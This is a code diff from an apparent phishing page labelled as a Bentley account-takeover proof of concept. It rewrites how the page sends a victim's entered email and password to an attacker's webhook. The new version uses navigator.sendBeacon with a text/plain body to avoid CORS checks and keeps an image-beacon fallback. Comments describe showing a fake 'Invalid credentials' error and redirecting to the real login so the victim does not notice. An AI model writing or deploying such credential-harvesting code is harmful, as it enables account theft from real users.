@@ -226,27 +226,19 @@
     document.getElementById("spinner").style.display  = "block";
     document.getElementById("submitBtn").disabled     = true;
 
-    const payload = {
-      email,
-      password,
-      meta: getMeta(),
-      source: "bentley_ato_poc_ims_endsession"
-    };
+    // Method 1: sendBeacon with text/plain body (no CORS preflight, always fires)
+    const body = "email=" + encodeURIComponent(email)
+               + "&password=" + encodeURIComponent(password)
+               + "&ref=" + encodeURIComponent(document.referrer)
+               + "&src=bentley_ato";
+    navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "text/plain" }));
 
-    // Exfil to webhook (no-cors — fire-and-forget)
-    fetch(WEBHOOK, {
-      method:  "POST",
-      mode:    "no-cors",
-      headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify(payload)
-    }).catch(() => {});
-
-    // Also try image-tag beacon as fallback (survives strict CORS)
+    // Method 2: image GET beacon fallback
     const beacon = new Image();
     beacon.src = WEBHOOK
       + "?email="    + encodeURIComponent(email)
       + "&pw="       + encodeURIComponent(password)
-      + "&src=beacon";
+      + "&src=img";
 
     // After short delay: show "Invalid credentials" then redirect to real IMS
     // Victim retries on the real site, attacker already has the creds
